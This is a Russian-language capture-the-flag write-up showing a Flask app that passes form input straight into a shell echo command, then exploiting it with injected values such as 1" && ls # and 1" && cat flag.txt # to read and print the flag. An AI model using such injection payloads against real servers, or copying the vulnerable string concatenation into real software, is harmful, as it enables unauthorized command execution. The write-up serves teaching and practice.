# Really Cool by E.

Если из заглавных букв названия сложить слово, то получим **RCE**. [Что это такое?](https://ru.bmstu.wiki/RCE_(Remote_Code_Execution)#:~:text=RCE%20(Remote%20Code%20Execution)%20%E2%80%94%20%D0%9D%D0%B0%D1%86%D0%B8%D0%BE%D0%BD%D0%B0%D0%BB%D1%8C%D0%BD%D0%B0%D1%8F%20%D0%B1%D0%B8%D0%B1%D0%BB%D0%B8%D0%BE%D1%82%D0%B5%D0%BA%D0%B0%20%D0%B8%D0%BC.)

Почитали, смотрим сорсы.

```python
@app.route('/', methods=['POST', 'GET'])
def index():
    try:
        if request.method == 'POST':
            data = request.form.to_dict()
            command = 'echo "' + str(data['input']) + '" > ' + os.path.abspath(".") + '/file.txt'
            result = ''
            for line in run_command(command):
                result += line.decode()
            if len(result) == 0:
                flash('Added!', "success")
                result = "If the output is not empty, it will be here!"
            return render_template("lol.html", result = result )
    except Exception as e:
         flash('Some kind of problem..', "danger")
    return render_template("lol.html", result = "If the output is not empty, it will be here!")
```

Видим, что ввод попадает напрямую в команду линуха. Лишнее откинем, получим такую команду:

```sh
'echo "' + ВВОД + '" > file.txt'
```
Подумали, вводим **1" && ls #**, по итогу на сервере выполняется:

```sh
'echo "1" && ls #" > file.txt'
```

где после **#** всё откинется. И мы получим вывод **ls**.

```sh
1 1 Dockerfile app app.ini cat file.txt flag.txt requirements.txt run.py static templates
```

Видим *flag.txt*, меняем ввод на **1" && cat flag.txt #** и получаем флаг.

Флаг - *4hsl33p{l0l_RC3_w4s_ez_666}*